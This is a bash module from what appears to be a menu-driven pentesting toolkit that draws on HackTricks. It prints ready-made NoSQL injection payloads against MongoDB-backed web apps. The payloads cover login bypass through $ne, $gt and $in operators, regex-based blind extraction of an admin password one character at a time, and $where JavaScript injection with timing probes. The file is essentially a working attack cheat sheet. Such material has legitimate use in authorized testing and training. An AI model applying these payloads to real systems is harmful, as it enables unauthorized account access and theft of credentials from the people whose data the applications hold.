#!/bin/bash
# HackTricks Ref: nosql-injection
# Module: NoSQL Injection (MongoDB Focus)

echo -e "${C6}[WEB ATTACK: NOSQL_INJECTION]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/nosql-injection"
echo -e "--------------------------------------------------"

echo -e "${C4}Select NoSQL Injection Vector:${NC}"
echo "1) Authentication Bypass (Operator Injection)"
echo "2) Data Extraction via Regex (Blind NoSQL)"
echo "3) Server-Side JavaScript Injection ($where)"
echo "4) POST/JSON Body Injection Payloads"
echo "0) Exit"

read -p "Selection: " nosql_opt

case $nosql_opt in
    1)
        echo -e "\n${C2}[*] NoSQL Auth Bypass (Common Payloads):${NC}"
        echo "Modify your JSON request to use the '\$ne' (Not Equal) operator:"
        echo -e "${C4}JSON:${NC} {\"username\": {\"\$ne\": \"guest\"}, \"password\": {\"\$ne\": \"wrong\"}}"
        echo -e "${C4}URL Param:${NC} username[\$ne]=guest&password[\$ne]=wrong"
        echo "This will match the first user in the DB (usually admin)."
        ;;
    2)
        echo -e "\n${C2}[*] Blind NoSQL (Regex Data Leakage):${NC}"
        echo "Extract data character by character using '\$regex':"
        echo " - {\"username\":\"admin\", \"password\":{\"\$regex\":\"^a\"}}"
        echo " - {\"username\":\"admin\", \"password\":{\"\$regex\":\"^b\"}}"
        echo "If the server returns 'Success', the password starts with that letter."
        ;;
    3)
        echo -e "\n${C2}[*] JavaScript Injection (\$where):${NC}"
        echo "If the app uses the \$where operator, try to inject JS code:"
        echo " - '; return true; var d='a"
        echo " - '; sleep(5000); var d='a"
        echo " - {\"\$where\": \"this.password.length > 10\"}"
        ;;
    4)
        echo -e "\n${C2}[*] POST JSON Payloads:${NC}"
        echo "Change Content-Type to 'application/json' and try:"
        echo " - {\"username\":{\"\$gt\":\"\"}, \"password\":{\"\$gt\":\"\"}}  (Greater Than)"
        echo " - {\"username\":{\"\$in\":[\"admin\",\"root\"]}, \"password\":{\"\$ne\":\"\"}}"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
